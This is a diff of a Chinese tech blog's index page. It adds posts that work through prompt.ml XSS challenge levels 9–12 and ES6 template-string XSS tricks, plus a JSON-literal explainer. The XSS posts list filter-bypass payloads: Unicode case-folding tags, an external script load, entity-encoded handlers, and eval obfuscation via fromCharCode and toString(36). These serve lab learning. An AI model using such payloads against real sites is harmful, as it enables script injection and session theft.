@@ -80,6 +80,94 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
+      <a href="/08/07/2016/xss-4/" title="xss习题集_2.2" itemprop="url">xss习题集_2.2</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2016-08-06T16:00:00.000Z" itemprop="datePublished"> 发表于 08-07-2016</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h2 id="引"><a href="#引" class="headerlink" title="引"></a>引</h2><p>还是这个站<a href="http://prompt.ml/0" target="_blank" rel="external">Prompt(1) to win</a>, 不过是下集, 没想到自己不会这么多, 才会出的下集2333</p>
+<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Level-9"><a href="#Level-9" class="headerlink" title="Level-9"></a>Level-9</h3><blockquote>
+<p>input.replace(/&lt;([a-zA-Z])/g, ‘<_$1'); input="input.toUpperCase();" return="" '<h1="">‘ + input + ‘‘;</_$1');></p>
+</blockquote>
+<p>主要是过滤了所有感觉能用的字符, 答案还是比较厉害..<br>js函数大写也有被过滤, 不过可以编码和外部加载解决.注意, 在linux/unix下文件名区分大小写, 可以申请全大写或者一些奇怪的字符来进行绕过<br>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſvg&gt;<span class="xml"><span class="tag">&lt;<span class="name">ſcript</span> <span class="attr">href</span>=<span class="string">//ᄒ.ws/XXXX</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">ſcript</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>自己写的变形:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſvg onload=&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)&gt;</span><br></pre></td></tr></table></figure></p>
+<h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p>目前我能找到的几个latin letter, 更多的需要探索 -&gt; <a href="http://graphemica.com/unicode/characters" target="_blank" rel="external">unicode-characters</a></p>
+<blockquote>
+<p>ß  =&gt; SS<br>ı  =&gt; I<br>ſ  =&gt; S</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;'</span>+<span class="string">'ß'</span>.toUpperCase()[<span class="number">0</span>]+<span class="string">'cript'</span>+<span class="string">'&gt;'</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="Level-10"><a href="#Level-10" class="headerlink" title="Level-10"></a>Level-10</h3><blockquote>
+<p>encodeURIComponent(input).replace(/prompt/g, ‘alert’);<br>input.replace(/‘/g, ‘’);</p>
+</blockquote>
+<p>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">promp<span class="string">'t(1)</span></span><br></pre></td></tr></table></figure></p>
+<p>这个好迷, 这么后面出了道简单题233</p>
+<blockquote>
+<p><a href="http://stackoverflow.com/questions/75980/when-are-you-supposed-to-use-escape-instead-of-encodeuri-encodeuricomponent" target="_blank" rel="external">stackoverflow-encode*</a><br>Note that encodeURIComponent does not escape the ‘ character</p>
+</blockquote>
+<h3 id="Level-11-DOM内json对象执行限制"><a href="#Level-11-DOM内json对象执行限制" class="headerlink" title="Level-11 DOM内json对象执行限制"></a>Level-11 DOM内json对象执行限制</h3><blockquote>
+<p>input.replace(/[[|\s+*/\&lt;&gt;&amp;^:;=~!%-]/g, ‘’);<br>var dataString = ‘{“action”:”login”,”message”:”Welcome back, ‘ + input + ‘.”}’;<br>document.write(data.message)</p>
+</blockquote>
+<p>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"(prompt(1))in"</span></span><br></pre></td></tr></table></figure></p>
+<p>学到的:</p>
+<blockquote>
+<ol>
+<li>document.write(alert(1))   //以前一直没碰到过dom类型的, 现在</li>
+<li>根据console错误类型判断能否xss, 这题语法错误, 但是是Error in execution.所以只要能parse出来就行</li>
+</ol>
+</blockquote>
+<p>Operator合集: <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Expressions_and_Operators" target="_blank" rel="external">MDN-oprators</a></p>
+<p>看到后面我才知道这题正则什么意思, <code>过滤一切符号类型的operator</code>. 然后从character中考虑就是in, instanceof .etc了</p>
+<h3 id="Level-12-script符号过滤"><a href="#Level-12-script符号过滤" class="headerlink" title="Level-12 script符号过滤"></a>Level-12 script符号过滤</h3><blockquote>
+<p>input = encodeURIComponent(input).replace(/‘/g, ‘’);<br>input = input.replace(/prompt/g, ‘alert’);</p>
+</blockquote>
+<p>和第10题类似, 不过屏蔽了<code>/</code>,<code>=</code>,<code>?</code>,<code>\s</code>, <code>,</code>, <code>+</code>等能想到的一些符号, 不过没有过滤<code>.</code>这个属性引用, 所以可以进行如下的构造</p>
+<p>Vector:(虽然做出来了.不过很长)<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(</span><br><span class="line">	<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>)</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">114</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">111</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">109</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">112</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">116</span>))</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>))</span><br><span class="line">		.concat(<span class="number">1</span>)</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>))</span><br><span class="line">)<span class="comment">//需要去掉\s</span></span><br></pre></td></tr></table></figure></p>
+<p>不过答案还用了<code>toString()</code>,比较灵活~<br>vector2:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(</span><br><span class="line">	(<span class="number">1558153217</span>).toString(<span class="number">36</span>)  <span class="comment">//数字可以通过 parseInt('prompt', 36) 获得</span></span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">40</span>))</span><br><span class="line">		.concat(<span class="number">1</span>)</span><br><span class="line">		.concat(<span class="built_in">String</span>.fromCharCode(<span class="number">41</span>))</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
+<p>也是给我了一个提醒, 想起来以前密码学学的一个toString()和parseInt()的进制转化了.<br>嗯, github还有个改进版本<br>vector3:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="number">1558153217</span>).toString(<span class="number">36</span>))(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
+<p>eval这个函数感觉像是没来过一样.完全不影响后续输出</p>
+<h3 id="Level-13"><a href="#Level-13" class="headerlink" title="Level-13"></a>Level-13</h3><p>&gt;</p>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Challenge:<br>  <a href="http://prompt.ml/0" target="_blank" rel="external">prompt</a><br>Writeup:<br>  <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">github-cure53</a></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/08/07/2016/xss-4/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/07/2016/xss-4/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
       <a href="/08/07/2016/say-2/" title="无题" itemprop="url">无题</a>
   </h1>
   <p class="article-author">By
@@ -127,86 +215,6 @@
         <header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/08/07/2016/xss-4/" title="xss习题集_2.2" itemprop="url">xss习题集_2.2</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2016-08-06T16:00:00.000Z" itemprop="datePublished"> 发表于 08-07-2016</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h2 id="引"><a href="#引" class="headerlink" title="引"></a>引</h2><p>还是这个站<a href="http://prompt.ml/0" target="_blank" rel="external">Prompt(1) to win</a>, 不过是下集, 没想到自己不会这么多, 才会出的下集2333</p>
-<h2 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h2><h3 id="Level-9"><a href="#Level-9" class="headerlink" title="Level-9"></a>Level-9</h3><blockquote>
-<p>input.replace(/&lt;([a-zA-Z])/g, ‘<_$1'); input="input.toUpperCase();" return="" '<h1="">‘ + input + ‘‘;</_$1');></p>
-</blockquote>
-<p>主要是过滤了所有感觉能用的字符, 答案还是比较厉害..<br>js函数大写也有被过滤, 不过可以编码和外部加载解决.注意, 在linux/unix下文件名区分大小写, 可以申请全大写或者一些奇怪的字符来进行绕过<br>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſvg&gt;<span class="xml"><span class="tag">&lt;<span class="name">ſcript</span> <span class="attr">href</span>=<span class="string">//ᄒ.ws/XXXX</span>&gt;</span></span><span class="xml"><span class="tag">&lt;/<span class="name">ſcript</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
-<p>自己写的变形:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ſvg onload=&amp;#112;&amp;#114;&amp;#111;&amp;#109;&amp;#112;&amp;#116;(1)&gt;</span><br></pre></td></tr></table></figure></p>
-<h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p>目前我能找到的几个latin letter, 更多的需要探索 -&gt; <a href="http://graphemica.com/unicode/characters" target="_blank" rel="external">unicode-characters</a></p>
-<blockquote>
-<p>ß  =&gt; SS<br>ı  =&gt; I<br>ſ  =&gt; S</p>
-</blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;'</span>+<span class="string">'ß'</span>.toUpperCase()[<span class="number">0</span>]+<span class="string">'cript'</span>+<span class="string">'&gt;'</span>);</span><br></pre></td></tr></table></figure>
-<h3 id="Level-10"><a href="#Level-10" class="headerlink" title="Level -10"></a>Level -10</h3><blockquote>
-<p>encodeURIComponent(input).replace(/prompt/g, ‘alert’);<br>input.replace(/‘/g, ‘’);</p>
-</blockquote>
-<p>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">promp<span class="string">'t(1)</span></span><br></pre></td></tr></table></figure></p>
-<p>这个好迷, 这么后面出了道简单题233</p>
-<blockquote>
-<p><a href="http://stackoverflow.com/questions/75980/when-are-you-supposed-to-use-escape-instead-of-encodeuri-encodeuricomponent" target="_blank" rel="external">stackoverflow-encode*</a><br>Note that encodeURIComponent does not escape the ‘ character</p>
-</blockquote>
-<h3 id="Level-11-DOM内json对象执行限制"><a href="#Level-11-DOM内json对象执行限制" class="headerlink" title="Level-11 DOM内json对象执行限制"></a>Level-11 DOM内json对象执行限制</h3><blockquote>
-<p>input.replace(/[[|\s+*/\&lt;&gt;&amp;^:;=~!%-]/g, ‘’);<br>var dataString = ‘{“action”:”login”,”message”:”Welcome back, ‘ + input + ‘.”}’;<br>document.write(data.message)</p>
-</blockquote>
-<p>vector:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"(prompt(1))in"</span></span><br></pre></td></tr></table></figure></p>
-<p>学到的:</p>
-<blockquote>
-<ol>
-<li>document.write(alert(1))   //以前一直没碰到过dom类型的, 现在</li>
-<li>根据console错误类型判断能否xss, 这题语法错误, 但是是Error in execution.所以只要能parse出来就行</li>
-</ol>
-</blockquote>
-<p>Operator合集: <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Expressions_and_Operators" target="_blank" rel="external">MDN-oprators</a></p>
-<p>看到后面我才知道这题正则什么意思, <code>过滤一切符号类型的operator</code>. 然后从character中考虑就是in, instanceof .etc了</p>
-<h3 id="Level-12"><a href="#Level-12" class="headerlink" title="Level-12"></a>Level-12</h3><p>有点累了, 好多知识点不会, 明天搞定收工</p>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Challenge:<br>  <a href="http://prompt.ml/0" target="_blank" rel="external">prompt</a><br>Writeup:<br>  <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">github-cure53</a></p>
-
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-
-
-<div class="comments-count">
-	
-	  	<span></span>
-		<a href="/08/07/2016/xss-4/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/07/2016/xss-4/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
       <a href="/08/07/2016/js-json-parse/" title="JSON使用注意" itemprop="url">JSON使用注意</a>
   </h1>
   <p class="article-author">By
@@ -226,7 +234,24 @@
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> code = <span class="string">'"\u0070\u0072\u006f\u006d\u0070\u0074\u0028\u0031\u0029"'</span>;</span><br><span class="line"><span class="comment">//  code必须由单引号扩起来</span></span><br><span class="line"><span class="built_in">JSON</span>.parse(code); <span class="comment">// "prompt(1)"</span></span><br><span class="line"><span class="built_in">eval</span>(code); <span class="comment">// prompt(1)</span></span><br></pre></td></tr></table></figure>
 <h3 id="JSON对象"><a href="#JSON对象" class="headerlink" title="JSON对象"></a>JSON对象</h3><p>由上面引出来一个新的问题就是如果传入一个json对象, 那么对象应该是这么写:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> postData = &#123;</span><br><span class="line">  <span class="string">"name"</span> : <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
 <p>而不是<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> postData = &#123;</span><br><span class="line">  <span class="string">'neme'</span> : <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/JSON" target="_blank" rel="external">MDN-json</a></p>
+<h2 id="json对象和对象字面量"><a href="#json对象和对象字面量" class="headerlink" title="json对象和对象字面量~"></a>json对象和对象字面量~</h2><blockquote>
+<p>Update in 08/11/2016</p>
+<blockquote>
+<p>汤姆大叔<br>JSON有非常严格的语法，在string上下文里<code>{ &quot;prop&quot;: &quot;val&quot; }</code>是个合法的JSON，但<code>{ prop: &quot;val&quot; }</code>和<code>{ &#39;prop&#39;: &#39;val&#39; }</code>确实不合法的</p>
+</blockquote>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  JS对象字面量</span></span><br><span class="line"><span class="keyword">var</span> jsObj = &#123;prop:<span class="string">"val"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  json对象</span></span><br><span class="line"><span class="keyword">var</span> jsonObj = &#123;<span class="string">"prop"</span>:<span class="string">"val"</span>&#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h3><blockquote>
+<p>复杂的数据结构经常需要用到，并且通过各种各样的中括号{}，小括号()，叫括号&lt;&gt;和空格来组成，这个字符串仅仅是按照要求规范好的字符。</p>
+</blockquote>
+<p>由于在js中所以一般使用的是json, 替代者有<code>YAML</code>和<code>XML</code>（甚至<code>request params</code>）</p>
+<h3 id="字面量"><a href="#字面量" class="headerlink" title="字面量"></a>字面量</h3><blockquote>
+<p>Mozilla Developer Center<br>1.他们是固定的值，不是变量，让你从“字面上”理解脚本。 (Literals)<br>2.字符串字面量是由双引号（”）或单引号（’）包围起来的零个或多个字符组成的。(Strings Literals)<br>3.对象字面量是由大括号（{}）括起来的零个或多个对象的属性名-值对。(Object Literals)</p>
+</blockquote>
+<h3 id="什么时候算是JSON"><a href="#什么时候算是JSON" class="headerlink" title="什么时候算是JSON?"></a>什么时候算是JSON?</h3><blockquote>
+<p>形如<code>{ &quot;prop&quot;: &quot;val&quot; }</code>. 可能是JavaScript对象字面量也有可能是JSON字符串;<br>取决于什么上下文使用它;<br>如果是用在string上下文（<code>用单引号或双引号引住，或者从text文件读取</code>）的话，那它就是JSON字符串;<br>如果是用在对象字面量上下文中，那它就是对象字面量;</p>
+</blockquote>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/JSON" target="_blank" rel="external">MDN-json</a><br><a href="http://www.cnblogs.com/TomXu/archive/2012/01/11/2311956.html" target="_blank" rel="external">深入理解js-汤姆大叔</a></p>
 
         
         
@@ -241,6 +266,67 @@
 	
 	  	<span></span>
 		<a href="/08/07/2016/js-json-parse/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/07/2016/js-json-parse/" data-count-type="comments">&nbsp;</a>
+	
+</div>
+
+</footer>
+
+
+    </article>
+
+
+
+
+
+
+   
+    
+    <article class="post-expand post" itemprop="articleBody"> 
+        <header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/08/05/2016/js-template-strings/" title="ES6 模板字符串&amp;&amp;Xss利用" itemprop="url">ES6 模板字符串&amp;&amp;Xss利用</a>
+  </h1>
+  <p class="article-author">By
+       
+		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
+		
+  <p class="article-time">
+    <time datetime="2016-08-04T16:00:00.000Z" itemprop="datePublished"> 发表于 08-05-2016</time>
+    
+  </p>
+</header>
+    <div class="article-content">
+        
+        <h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>没事看了个xss, 借此学习一下这个template_strings</p>
+<h2 id="Method"><a href="#Method" class="headerlink" title="Method"></a>Method</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`strings`</span> <span class="comment">//  单行 和' " 用法一样</span></span><br><span class="line"><span class="string">`string1</span><br><span class="line"> string2`</span> <span class="comment">//  多行</span></span><br><span class="line"><span class="string">`string <span class="subst">$&#123;expression&#125;</span> string`</span> <span class="comment">// 可以直接引用变量, 像angualr一样</span></span><br></pre></td></tr></table></figure>
+<h3 id="注意注释"><a href="#注意注释" class="headerlink" title="注意注释"></a>注意注释</h3><blockquote>
+<pre><code>console.log(` test1        // there is no comments can stand!
+     test2`);
+</code></pre></blockquote>
+<p>这句话看似有个单行注释, 实际上`会忽略注释的存在, 所以<code>注释无效</code></p>
+<h3 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;a&#125;</span>`</span>);</span><br><span class="line"><span class="comment">//  输出1</span></span><br></pre></td></tr></table></figure>
+<h3 id="特殊的-num"><a href="#特殊的-num" class="headerlink" title="特殊的//num"></a>特殊的//num</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;1234&#125;</span>`</span>);</span><br><span class="line"><span class="comment">//  可以直接输出1234</span></span><br></pre></td></tr></table></figure>
+<p>这个原因应该是 <code>数字开头</code>的不能作为js变量</p>
+<h2 id="xssVector"><a href="#xssVector" class="headerlink" title="xssVector"></a>xssVector</h2><h3 id="1st"><a href="#1st" class="headerlink" title="1st"></a>1st</h3><p>最简单的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert<span class="string">`1`</span></span><br><span class="line"><span class="comment">//  直接绕过() "" ''</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="2nd"><a href="#2nd" class="headerlink" title="2nd"></a>2nd</h3><p>第二个…<del>感觉是失败了</del><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert.call(<span class="keyword">this</span>, <span class="string">`<span class="subst">$&#123;1&#125;</span>`</span>)</span><br></pre></td></tr></table></figure></p>
+<h3 id="3rd"><a href="#3rd" class="headerlink" title="3rd"></a><strong>3rd</strong></h3><p>这个很棒, 绕过了() “” ‘’, 能使eval拥有<code>()</code>可以执行并且支持多种编码, 吊吊吊<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>.call<span class="string">`<span class="subst">$&#123;`alert\x281)`&#125;</span>`</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="最后一个"><a href="#最后一个" class="headerlink" title="最后一个"></a>最后一个</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">`<span class="subst">$&#123;`alert(1)`&#125;</span>`</span> === <span class="string">'alert(1)'</span> ? alert(<span class="literal">true</span>) : alert(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//true</span></span><br></pre></td></tr></table></figure>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="external">MDN</a></p>
+
+        
+        
+        <p class="article-more-link">
+          
+       </p>
+    </div>
+    <footer class="article-footer clearfix">
+
+
+<div class="comments-count">
+	
+	  	<span></span>
+		<a href="/08/05/2016/js-template-strings/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/05/2016/js-template-strings/" data-count-type="comments">&nbsp;</a>
 	
 </div>
 
@@ -284,7 +370,7 @@
 <p>input = input.replace(/[=(]/g, ‘’);</p>
 </blockquote>
 <ol>
-<li>ES6的新特性可以用 ` 来替换 ( <del>不过这题不行</del><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt.call`this, 1`</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<li>ES6的新特性可以用 ` 来替换 ( <del>不过这题不行</del><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">prompt.call`<span class="keyword">this</span>, <span class="number">1</span>`</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
 </ol>
 <p>2.找了半天, 找到了vector<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">prompt&amp;#40;1&amp;#41;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
@@ -361,7 +447,7 @@
 <p><a href="https://en.wikipedia.org/wiki/Newline" target="_blank" rel="external">WikiPedia-Newline</a><br>LF:    Line Feed, U+000A<br>VT:    Vertical Tab, U+000B<br>FF:    Form Feed, U+000C<br>CR:    Carriage Return, U+000D<br>CR+LF: CR (U+000D) followed by LF (U+000A)<br>NEL:   Next Line, U+0085<br>LS:    Line Separator, U+2028<br>PS:    Paragraph Separator, U+2029</p>
 </blockquote>
 <p>用法写在下面了, 运行就懂了, 不过<code>&lt;!--</code> 还是和 <code>--&gt;</code>有点区别的(看1, 4)</p>
-<h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml"></span><br><span class="line">//	console.log("</span><br><span class="line">	alert(1)<span class="comment">&lt;!--");</span><br><span class="line">	alert(2)--&gt;</span>alert(3)</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span><br><span class="line">	//	console.log("</span><br><span class="line">		alert(4)--&gt;")</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!-- 注意两个script标签别放一起 --&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"></span><br><span class="line">//	console.log("</span><br><span class="line">	alert(1)<span class="comment">&lt;!--");</span><br><span class="line">	alert(2)--&gt;</span>alert(3)</span><br><span class="line"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span><br><span class="line">	//	console.log("</span><br><span class="line">		alert(4)--&gt;")</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="comment">&lt;!-- 注意两个script标签别放一起 --&gt;</span></span><br></pre></td></tr></table></figure>
 <h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>Challenge:<br>  <a href="http://prompt.ml/0" target="_blank" rel="external">prompt</a><br>Writeup:<br>  <a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="external">github-cure53</a></p>
 
         
@@ -377,67 +463,6 @@
 	
 	  	<span></span>
 		<a href="/08/05/2016/xss-3/#comments" class="ds-thread-count comments-count-link" data-thread-key="08/05/2016/xss-3/" data-count-type="comments">&nbsp;</a>
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/08/05/2016/js-template-strings/" title="ES6 模板字符串&amp;&amp;Xss利用" itemprop="url">ES6 模板字符串&amp;&amp;Xss利用</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="https://plus.google.com/106896526077043222500?rel=author" title="A1ex" target="_blank" itemprop="author">A1ex</a>
-		
-  <p class="article-time">
-    <time datetime="2016-08-04T16:00:00.000Z" itemprop="datePublished"> 发表于 08-05-2016</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><p>没事看了个xss, 借此学习一下这个template_strings</p>
